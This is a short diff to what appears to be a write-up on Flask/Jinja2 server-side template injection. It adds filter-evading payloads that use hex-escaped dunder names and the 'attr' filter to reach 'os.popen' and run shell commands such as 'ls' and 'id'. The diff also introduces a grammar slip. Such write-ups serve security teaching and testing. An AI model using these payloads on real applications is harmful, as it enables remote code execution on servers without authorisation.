@@ -326,8 +326,12 @@ To bypass these filters, I needed a way to access object attributes without usin
 3.  **Using `request` Object:**
     The `request` object is often available in Flask templates and can be used as a starting point to reach the `application` and its `globals`.
 
-Combining these techniques, I could craft a payload that avoided all detections:
+Combining these techniques, I could craft a payloads that avoided all detections:
 `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}`
+
+`{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('ls')|attr('read')()}}`
+
+`{{self|attr('\x5fTemplateReference\x5f\x5fcontext')|attr('get')('cycler')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('id')|attr('read')()}}`
 
 * * *
 
